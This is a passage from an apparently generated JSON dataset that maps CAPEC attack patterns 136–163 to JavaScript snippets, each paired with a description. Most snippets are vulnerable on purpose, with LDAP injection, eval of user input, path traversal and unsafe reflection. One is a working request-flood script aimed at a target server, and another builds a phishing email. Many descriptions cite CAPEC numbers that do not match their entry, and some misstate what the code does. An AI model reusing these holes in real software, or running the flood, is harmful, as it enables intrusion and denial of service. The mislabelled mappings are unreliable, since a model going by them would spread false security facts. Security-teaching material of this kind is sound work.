        "code_snippet": "const ldap = require('ldapjs');\nconst client = ldap.createClient({ url: 'ldap://localhost:389' });\n\nfunction authenticate(username, password) {\n  const base = 'dc=example,dc=com';\n  const filter = `(uid=${username})`;\n  const opts = {\n    filter: filter,\n    scope: 'sub'\n  };\n\n  client.search(base, opts, (err, res) => {\n    if (err) {\n      console.error('LDAP search error:', err);\n      return;\n    }\n\n    res.on('searchEntry', (entry) => {\n      console.log('User found:', entry.object);\n      // Here you would typically check the password\n    });\n\n    res.on('error', (err) => {\n      console.error('LDAP search error:', err);\n    });\n  });\n}\n\nauthenticate('*', 'password');",
        "description": "This JavaScript code snippet demonstrates a vulnerable LDAP query that is susceptible to LDAP Injection. The `authenticate` function takes a `username` and `password` as input and constructs an LDAP query filter using the provided `username`. The filter is then used to search the LDAP directory. If an attacker inputs a special character like `*` as the username, it can manipulate the LDAP query to return all users in the directory, thereby exposing sensitive information. This code embodies the main idea of CAPEC-90 (LDAP Injection) and highlights CWE-90 (Improper Neutralization of Special Elements used in an LDAP Query) by not properly sanitizing the user input before using it in the LDAP query."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const query = require('url').parse(req.url, true).query;\n  const userInput = query.userInput;\n  const sensitiveData = 'secret';\n\n  // Vulnerable code: directly using user input in a GET request\n  const url = `http://example.com/api?data=${userInput}&sensitive=${sensitiveData}`;\n\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + err.message);\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming GET requests. It extracts a user-provided input from the query string and uses it to construct another GET request to an external API. The code is vulnerable to parameter injection because it directly incorporates user input into the URL without proper sanitization or encoding. An attacker could manipulate the 'userInput' parameter to inject additional parameters or modify existing ones, potentially altering the behavior of the request. This example also demonstrates the use of sensitive data in a GET request, which is a security risk as per CWE-598."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const urlParams = new URLSearchParams(req.url.split('?')[1]);\n  const className = urlParams.get('class');\n  const methodName = urlParams.get('method');\n\n  try {\n    const ClassRef = require(`./classes/${className}`);\n    const instance = new ClassRef();\n    const result = instance[methodName]();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(result);\n  } catch (error) {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + error.message);\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that uses reflection to dynamically load and invoke methods from classes based on URL parameters. The server extracts 'class' and 'method' parameters from the URL, then attempts to load the specified class and invoke the specified method. This embodies the main idea of CAPEC-470 (Reflection Injection) by using externally-controlled input to select classes and methods. The code is vulnerable to CWE-470 (Unsafe Reflection) as it does not validate or sanitize the input, allowing an attacker to potentially load malicious classes or invoke unintended methods. This can lead to various security issues such as unauthorized access, data leakage, or even full control over the application."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nhttp.createServer((req, res) => {\n  let filePath = path.join(__dirname, 'public', req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. The 'filePath' is constructed using the 'path.join' method, which concatenates the '__dirname', 'public' directory, and the requested URL. However, this code is vulnerable to a Relative Path Traversal attack because it does not properly validate or sanitize the 'req.url' input. An attacker could exploit this by sending a specially crafted URL containing sequences like '../' to access files outside the 'public' directory, potentially exposing sensitive information or system files. This snippet embodies the main idea of CAPEC-126 (Relative Path Traversal) and related CWEs by demonstrating how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "const forms = ['form1', 'form2', 'form3'];\nlet currentFormIndex = 0;\n\nfunction navigateToForm(formName) {\n  const formIndex = forms.indexOf(formName);\n  if (formIndex === -1 || formIndex > currentFormIndex) {\n    alert('Invalid form navigation');\n    return;\n  }\n  currentFormIndex = formIndex;\n  document.getElementById(formName).style.display = 'block';\n}\n\n// Simulate form submission\nfunction submitForm(formName) {\n  if (forms.indexOf(formName) !== currentFormIndex) {\n    alert('Form submission out of order');\n    return;\n  }\n  currentFormIndex++;\n  alert('Form submitted successfully');\n}\n\n// Example of bypassing intermediate forms\nnavigateToForm('form3'); // This should not be allowed\nsubmitForm('form3'); // This should not be allowed",
        "description": "This JavaScript code snippet represents a simplified version of a multi-step form navigation system. The 'forms' array contains the names of the forms in the sequence. The 'currentFormIndex' variable tracks the current form the user is on. The 'navigateToForm' function allows navigation to a form only if it is the current or a previous form, preventing skipping ahead. The 'submitForm' function ensures forms are submitted in order. The example at the end demonstrates an attempt to bypass intermediate forms, which should be prevented. This code embodies the CAPEC idea of 'Bypassing of Intermediate Forms in Multiple-Form Sets' and highlights related weaknesses such as incomplete internal state distinction (CWE-372) and reliance on untrusted inputs (CWE-807)."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "const cache = {}; // Simulated cache\n\nfunction fetchData(url) {\n  if (cache[url]) {\n    return cache[url]; // Return cached data\n  }\n  // Simulate fetching data from a less trusted source\n  const data = fetchFromLessTrustedSource(url);\n  cache[url] = data; // Store in cache\n  return data;\n}\n\nfunction fetchFromLessTrustedSource(url) {\n  // Simulate fetching data from an untrusted source\n  return 'untrusted data';\n}\n\n// Example usage\nconst data = fetchData('http://example.com');\nconsole.log(data); // Outputs: 'untrusted data'\n\n// Attacker can poison the cache\ncache['http://example.com'] = 'malicious data';\nconst poisonedData = fetchData('http://example.com');\nconsole.log(poisonedData); // Outputs: 'malicious data'",
        "description": "This JavaScript code snippet demonstrates a simple cache poisoning scenario. The `fetchData` function first checks if the requested URL's data is already in the cache. If it is, it returns the cached data. If not, it fetches the data from a less trusted source and stores it in the cache. The `fetchFromLessTrustedSource` function simulates fetching data from an untrusted source. An attacker can exploit this by directly modifying the cache to insert malicious data. When the `fetchData` function is called again with the same URL, it returns the poisoned data from the cache. This example highlights vulnerabilities such as using less trusted sources (CWE-348), insufficient verification of data authenticity (CWE-345), and acceptance of untrusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "const dns = require('dns');\n\nfunction resolveDomain(domain) {\n  dns.resolve4(domain, (err, addresses) => {\n    if (err) throw err;\n    console.log(`IP addresses for ${domain}: ${addresses}`);\n    // Simulate using the resolved IP address for a security-critical action\n    performSecurityCriticalAction(addresses[0]);\n  });\n}\n\nfunction performSecurityCriticalAction(ip) {\n  dns.reverse(ip, (err, hostnames) => {\n    if (err) throw err;\n    if (hostnames.length === 0) {\n      console.error('No hostnames found for IP:', ip);\n      return;\n    }\n    console.log(`Hostnames for IP ${ip}: ${hostnames}`);\n    // Here we assume the hostname is trusted without proper validation\n    if (hostnames[0] === 'trusted.example.com') {\n      console.log('Performing security-critical action for trusted host');\n    } else {\n      console.error('Untrusted host, aborting action');\n    }\n  });\n}\n\nresolveDomain('example.com');",
        "description": "This JavaScript code snippet demonstrates a DNS resolution process that is vulnerable to DNS cache poisoning. The `resolveDomain` function resolves a domain name to its IP address and then calls `performSecurityCriticalAction` with the resolved IP. The `performSecurityCriticalAction` function performs a reverse DNS lookup on the IP address to obtain the hostname and makes a security decision based on the hostname. The code assumes the hostname is trusted without proper validation, embodying CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) and CWE-346 (Origin Validation Error). This can lead to DNS cache poisoning, where an attacker can manipulate the DNS cache to redirect traffic to a malicious IP address."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = `.${req.url}`;\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('404 Not Found');\n      res.end();\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.write(data);\n      res.end();\n    }\n  });\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from the file system based on the URL requested by the client. If the file exists, it is served to the client; otherwise, a 404 error is returned. This code embodies the main idea of CAPEC-111 (Detect Unpublicized Web Pages) by potentially exposing unpublicized or sensitive files stored under the web root (CWE-219) without proper authorization checks (CWE-425). Additionally, it does not verify the integrity of the files being served (CWE-494), and if a version-control repository is stored under the web root, it could be exposed to unauthorized users (CWE-527)."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/admin') {\n    fs.readFile('./admin.html', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/html'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.end(data);\n      }\n    });\n  } else if (req.url === '/wsdl') {\n    fs.readFile('./service.wsdl', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/xml'});\n        res.end('404 Not Found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/xml'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(403, {'Content-Type': 'text/html'});\n    res.end('403 Forbidden');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for requests and serves different files based on the URL path. If the request URL is '/admin', it serves an 'admin.html' file, and if the URL is '/wsdl', it serves a 'service.wsdl' file. For any other URL, it returns a '403 Forbidden' response. This code embodies the main idea of the CAPEC 'Detect Unpublicized Web Services' by exposing potentially sensitive files ('admin.html' and 'service.wsdl') without proper authorization checks. This can lead to vulnerabilities such as CWE-425 (Direct Request), CWE-651 (Exposure of WSDL File), and CWE-223 (Omission of Security-relevant Information) as the server does not enforce adequate security controls or log access attempts."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "const crypto = require('crypto');\n\nfunction calculateChecksum(message) {\n  return crypto.createHash('md5').update(message).digest('hex');\n}\n\nfunction sendMessage(message) {\n  const checksum = calculateChecksum(message);\n  // Simulate sending message and checksum\n  return { message, checksum };\n}\n\nfunction receiveMessage(packet) {\n  const { message, checksum } = packet;\n  const calculatedChecksum = calculateChecksum(message);\n  if (calculatedChecksum !== checksum) {\n    console.log('Message integrity check failed!');\n  } else {\n    console.log('Message received successfully.');\n  }\n}\n\n// Simulate an attacker modifying the message and checksum\nlet packet = sendMessage('Hello, World!');\npacket.message = 'Hello, Attacker!';\npacket.checksum = calculateChecksum('Hello, Attacker!');\n\nreceiveMessage(packet);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of message integrity verification using checksums. The `calculateChecksum` function generates an MD5 hash of the message, which is used as the checksum. The `sendMessage` function simulates sending a message along with its checksum. The `receiveMessage` function verifies the integrity of the received message by recalculating the checksum and comparing it with the received checksum. The code also simulates an attack where the message and checksum are modified by an adversary, demonstrating how the integrity check can be spoofed. This example highlights the vulnerability described in CAPEC-37 (Checksum Spoofing) and related CWEs, such as the use of a weak hash function (CWE-328) and improper validation of integrity check values (CWE-354)."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/upload-schema', (req, res) => {\n  const schemaPath = req.body.schemaPath;\n  fs.readFile(schemaPath, 'utf8', (err, data) => {\n    if (err) {\n      return res.status(500).send('Error reading schema file');\n    }\n    const parser = new xml2js.Parser();\n    parser.parseString(data, (err, result) => {\n      if (err) {\n        return res.status(500).send('Error parsing schema');\n      }\n      // Assume the schema is valid and use it for further processing\n      res.send('Schema uploaded and parsed successfully');\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable web application using Express.js that allows users to upload an XML schema file. The schema file path is provided by the user through a POST request. The server reads the file and parses it using the xml2js library without validating the schema against a trusted source. This embodies the main idea of XML Schema Poisoning (CAPEC-170) by allowing an adversary to upload a malicious schema, potentially corrupting or modifying the XML processing logic. The code also demonstrates related weaknesses such as CWE-15 (External Control of System or Configuration Setting) by allowing external control over the schema path, CWE-112 (Missing XML Validation) by not validating the XML schema, and CWE-91 (XML Injection) by not neutralizing special elements in the XML."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "const http = require('http');\nconst xmlPayload = '<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\"><soap:Body><test>data</test></soap:Body></soap:Envelope>';\n\nfunction sendXmlRequest() {\n  const options = {\n    hostname: 'target-server.com',\n    port: 80,\n    path: '/soap-endpoint',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/soap+xml',\n      'Content-Length': Buffer.byteLength(xmlPayload)\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  });\n\n  req.on('error', (e) => {});\n  req.write(xmlPayload);\n  req.end();\n}\n\nsetInterval(sendXmlRequest, 10);",
        "description": "This JavaScript code snippet demonstrates a basic implementation of an 'XML Ping of the Death' attack. The code repeatedly sends small SOAP XML messages to a target server at a rapid rate, aiming to deplete the server's resources and potentially cause a denial of service. The `sendXmlRequest` function constructs an HTTP POST request with a SOAP XML payload and sends it to the specified target server. The `setInterval` function ensures that this request is sent every 10 milliseconds, creating a flood of resource-intensive requests. This code embodies the CAPEC by leveraging SOAP transactions to amplify the resource consumption on the target server. The related CWEs are represented by the lack of resource throttling (CWE-770), uncontrolled resource consumption (CWE-400), and the potential for missing XML validation (CWE-112)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userContent = queryObject.content;\n\n  // CWE-345: Insufficient Verification of Data Authenticity\n  if (!userContent) {\n    res.writeHead(400, {'Content-Type': 'text/html'});\n    res.end('Invalid content');\n    return;\n  }\n\n  // CWE-433: Unparsed Raw Web Content Delivery\n  res.writeHead(200, {'Content-Type': 'text/html'});\n  res.end(`<html><body>${userContent}</body></html>`);\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads a 'content' query parameter from the URL and directly injects it into the HTML response without proper validation or sanitization. This embodies the main idea of CAPEC-139 (Content Spoofing) by allowing an adversary to modify the content displayed to the user. The code also demonstrates CWE-345 (Insufficient Verification of Data Authenticity) by not verifying the authenticity of the 'content' parameter, and CWE-433 (Unparsed Raw Web Content Delivery) by delivering raw user content directly in the response. This can lead to content spoofing, where an attacker can inject malicious content into the web page."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction createTempFile() {\n  const tempDir = os.tmpdir();\n  const tempFileName = `${tempDir}/tempfile_${Math.random().toString(36).substring(2, 15)}.txt`;\n  fs.writeFileSync(tempFileName, 'Temporary data');\n  console.log(`Temporary file created at: ${tempFileName}`);\n}\n\ncreateTempFile();",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file with a predictable name in the system's temporary directory. The `os.tmpdir()` function is used to get the temporary directory, and a predictable file name is generated using a random string. The `fs.writeFileSync` function creates the file with default permissions, which may be insecure. This code embodies the main idea of CAPEC-139: 'Explore for Predictable Temporary File Names', as it shows how an attacker could predict the location and name of temporary files. The related CWEs are represented by the use of insecure temporary file creation (CWE-377), potential insecure permissions (CWE-378), and the creation of the file in a directory that may have insecure permissions (CWE-379)."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Example of a common resource location\nconst configFilePath = path.join('/etc', 'config.json');\n\n// Read the configuration file\nfs.readFile(configFilePath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading the config file:', err);\n    return;\n  }\n  console.log('Config file content:', data);\n\n  // Simulate improper zeroization of sensitive data\n  let sensitiveData = JSON.parse(data).sensitiveInfo;\n  console.log('Sensitive Data:', sensitiveData);\n\n  // Improperly clear sensitive data\n  sensitiveData = null;\n  console.log('Sensitive Data after clearing:', sensitiveData);\n});",
        "description": "This JavaScript code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' by accessing a configuration file located in a well-known directory (/etc/config.json). The code reads the file and extracts sensitive information. It then attempts to clear the sensitive data but does so improperly by merely setting the variable to null, which does not guarantee that the data is securely erased from memory. This embodies the CAPEC idea by showing how an adversary can exploit common resource locations to access sensitive information and highlights related CWEs such as improper zeroization and exposure of sensitive information."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "const users = { 'admin': 'password123' }; \n\nfunction login(username, password) { \n  if (users[username] && users[username] === password) { \n    console.log('Login successful!'); \n    return true; \n  } else { \n    console.log('Login failed!'); \n    return false; \n  } \n} \n\n// Simulated login attempt \nlogin('admin', 'password123'); \n\n// Identity spoofing attempt \nlogin('admin', 'password123');",
        "description": "This JavaScript code snippet demonstrates a simple login function that checks a hardcoded username and password. The 'users' object stores user credentials, and the 'login' function verifies the provided username and password against this object. This code is vulnerable to identity spoofing due to several weaknesses: \n\n1. **Improper Authentication (CWE-287)**: The code does not use any robust authentication mechanism, making it easy for an attacker to spoof the identity by guessing or stealing the password. \n\n2. **Authentication Bypass by Spoofing (CWE-290)**: The simplistic authentication scheme can be easily bypassed if an attacker knows or can guess the credentials. \n\n3. **Weak Authentication (CWE-1390)**: The use of a hardcoded password and lack of additional verification steps make the authentication weak. \n\n4. **Key Exchange without Entity Authentication (CWE-322)**: Although not directly shown in this snippet, the lack of secure key exchange mechanisms can lead to vulnerabilities in a real-world scenario. \n\n5. **Authentication Bypass by Assumed-Immutable Data (CWE-302)**: The code assumes that the 'users' object and its contents are immutable and secure, which is not the case. An attacker could potentially modify this data to bypass authentication."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserInput(input) {\n    // Improper Input Validation\n    if (input.includes('<script>')) {\n        console.log('Invalid input detected!');\n        return;\n    }\n    // Reliance on Untrusted Inputs in a Security Decision\n    if (input === 'admin') {\n        console.log('Welcome, admin!');\n    } else {\n        console.log('Welcome, user!');\n    }\n}\n\n// Example of vulnerable input\nprocessUserInput('<script>alert(\"XSS\")</script>');\nprocessUserInput('admin');",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The `processUserInput` function attempts to validate the input by checking for the presence of the '<script>' tag, which is a naive and insufficient method of preventing XSS attacks. Additionally, the function makes a security decision based on the input value, treating 'admin' as a special case without proper authentication. This can be exploited by an attacker to gain unauthorized access or execute malicious scripts."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "const fetchResource = (url) => {\n  fetch(url)\n    .then(response => response.json())\n    .then(data => {\n      console.log('Resource data:', data);\n    })\n    .catch(error => {\n      console.error('Error fetching resource:', error);\n    });\n};\n\n// Example usage\nconst userProvidedUrl = 'http://malicious.example.com/resource';\nfetchResource(userProvidedUrl);",
        "description": "This JavaScript code snippet demonstrates a potential Resource Location Spoofing vulnerability. The function `fetchResource` takes a URL as an argument and fetches data from that URL. In the example usage, the URL is provided by the user, which could be a malicious URL controlled by an adversary. This can lead to the application fetching and using resources from unintended and potentially harmful locations. The code does not verify the source of the URL, making it susceptible to CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints). This snippet embodies the main idea of CAPEC-451 by showing how an adversary can deceive an application into requesting a resource from an unintended location."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to create a temporary file with sensitive information\nfunction createTempFile(data) {\n  const tempDir = path.join(__dirname, 'temp');\n  const tempFilePath = path.join(tempDir, 'tempfile.txt');\n\n  // Ensure the temp directory exists\n  if (!fs.existsSync(tempDir)) {\n    fs.mkdirSync(tempDir);\n  }\n\n  // Write sensitive data to the temporary file\n  fs.writeFileSync(tempFilePath, data);\n\n  console.log('Temporary file created at:', tempFilePath);\n}\n\n// Example usage\nconst sensitiveData = 'User password: 12345';\ncreateTempFile(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates the creation of a temporary file that stores sensitive information, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary directory and a file within it, then writes sensitive data to the file. This example is vulnerable because it does not set secure permissions for the temporary file or directory, potentially allowing unintended actors to access the sensitive information. This snippet highlights CWE-377 (Insecure Temporary File), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), and CWE-378 (Creation of Temporary File With Insecure Permissions)."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Cleartext transmission of sensitive information (CWE-319)\n    });\n    req.on('end', () => {\n      console.log('Received credentials:', body); // Potential sniffing vulnerability\n      res.end('Login successful');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for POST requests to the '/login' endpoint and logs the received credentials in cleartext. This represents a sniffing attack vulnerability (CAPEC-156) as the sensitive information (user credentials) is transmitted in cleartext (CWE-319) and can be intercepted by an unauthorized actor. The code does not encrypt the sensitive data before transmission (CWE-311), making it susceptible to sniffing attacks. Additionally, there is no mechanism to ensure the integrity of the message during transmission (CWE-924)."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString(); // Vulnerable: Collecting data in cleartext\n    });\n    req.on('end', () => {\n      console.log('Received login data:', body); // Vulnerable: Logging sensitive data\n      res.end('Login data received');\n    });\n  } else {\n    res.end('Hello World');\n  }\n}).listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/login' endpoint. When such a request is received, it collects the data in cleartext and logs it to the console. This embodies the CAPEC 'Sniffing Network Traffic' by demonstrating how sensitive information (e.g., login credentials) can be transmitted in cleartext (CWE-319) and logged without encryption (CWE-311), making it susceptible to network sniffing attacks. The code also highlights the risk of exposing sensitive information to unauthorized actors (CWE-497)."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// User input for library path\nlet userLibraryPath = process.argv[2];\n\n// Vulnerable code: using user-supplied path to load a library\ntry {\n  let library = require(path.resolve(userLibraryPath, 'library.js'));\n  library.execute();\n} catch (err) {\n  console.error('Failed to load library:', err);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an application uses a user-supplied path to load an external library. The 'userLibraryPath' is taken from user input (process.argv[2]), which can be manipulated by an adversary to point to a malicious library. The 'require' function is then used to load and execute the library. This embodies the main idea of the CAPEC 'Redirect Access to Libraries' by allowing an adversary to redirect the application's attempt to access a legitimate library to a malicious one. The related CWEs are represented as follows: CWE-426 (Untrusted Search Path) and CWE-73 (External Control of File Name or Path) are demonstrated by the use of an externally-supplied path to load a critical resource, and CWE-427 (Uncontrolled Search Path Element) is shown by the lack of control over the search path element."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/execute', (req, res) => {\n  const userScript = req.body.script;\n  try {\n    const result = eval(userScript); // CWE-79: Improper Neutralization of Input During Web Page Generation\n    res.send(`Result: ${result}`);\n  } catch (error) {\n    res.status(500).send(`Error: ${error.message}`); // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server that listens for POST requests on the '/execute' endpoint. The server expects a 'script' parameter in the request body, which it then executes using the 'eval' function. This embodies the main idea of CAPEC-111: 'Exploit Script-Based APIs', as it allows user-provided scripts to be executed on the server. The use of 'eval' here is particularly dangerous because it can execute arbitrary code, leading to potential security vulnerabilities such as Cross-Site Scripting (CWE-79) and improper handling of error messages (CWE-81). This example demonstrates how an attacker could exploit the ability to inject and execute scripts, potentially compromising the server and its data."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const targetUrl = queryObject.target;\n\n  if (!targetUrl) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No target URL specified');\n    return;\n  }\n\n  http.get(targetUrl, (response) => {\n    let data = '';\n\n    response.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    response.on('end', () => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(data);\n    });\n  }).on('error', (err) => {\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end('Error fetching target URL');\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens for incoming requests. It expects a query parameter 'target' which specifies the URL to fetch. The server then makes an HTTP GET request to the specified target URL and returns the response to the client. This code embodies the main idea of CAPEC-225 (Infrastructure Manipulation) by allowing an attacker to manipulate the routing of network messages. The code does not properly ensure that it is communicating with the correct endpoint (CWE-923), does not enforce message integrity (CWE-924), and exposes sensitive information to unauthorized control spheres (CWE-497). This can lead to scenarios where an attacker can redirect traffic to a malicious server, potentially capturing sensitive information."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<body>\n\n<form action=\"/purchase\" method=\"POST\">\n  <input type=\"hidden\" name=\"item_id\" value=\"12345\">\n  <input type=\"hidden\" name=\"price\" value=\"100\">\n  <input type=\"hidden\" name=\"quantity\" value=\"1\">\n  <input type=\"submit\" value=\"Buy Now\">\n</form>\n\n<script>\n  // Simulate an attacker modifying the hidden fields\n  document.querySelector('input[name=\"price\"]').value = '1'; // Change price to 1\n  document.querySelector('input[name=\"quantity\"]').value = '10'; // Change quantity to 10\n</script>\n\n</body>\n</html>",
        "description": "This HTML and JavaScript code snippet demonstrates a vulnerability where hidden fields in an HTML form are manipulated on the client-side before being submitted to the server. The form contains hidden fields for 'item_id', 'price', and 'quantity'. An attacker can use JavaScript to modify these hidden fields, changing the price and quantity to values that benefit them. This represents the CAPEC 'Manipulating Hidden Fields' and is related to CWEs such as 'Client-Side Enforcement of Server-Side Security' (CWE-602), 'Reliance on Untrusted Inputs in a Security Decision' (CWE-807), and 'External Control of Assumed-Immutable Web Parameter' (CWE-472). The server, trusting the client-side data, processes the manipulated values, leading to potential financial loss for the merchant."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "const trustedDomain = 'https://trusted.example.com';\nconst userEmail = 'user@example.com';\n\nfunction sendPhishingEmail() {\n  const phishingLink = `https://malicious.example.com?redirect=${encodeURIComponent(trustedDomain)}`;\n  const emailContent = `Dear user,\\n\\nWe noticed unusual activity on your account. Please verify your information by clicking the link below:\\n\\n<a href=\"${phishingLink}\">Verify Now</a>\\n\\nThank you,\\nTrusted Support Team`;\n  sendEmail(userEmail, 'Account Verification Required', emailContent);\n}\n\nfunction sendEmail(to, subject, body) {\n  // Simulated email sending function\n  console.log(`Sending email to: ${to}\\nSubject: ${subject}\\nBody: ${body}`);\n}\n\nsendPhishingEmail();",
        "description": "This JavaScript code snippet simulates a spear phishing attack. It constructs a phishing email that appears to come from a trusted entity, using a URL redirection to an untrusted site (CWE-601). The email content is tailored to the user, increasing the likelihood of the user clicking the malicious link. The `sendPhishingEmail` function creates an email with a link that redirects to a malicious site, exploiting the user's trust in the sender. The `sendEmail` function simulates the process of sending this email. This code embodies the main idea of CAPEC-98 by targeting a specific user with a deceptive email, leveraging CWE-601 to redirect the user to a malicious site."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
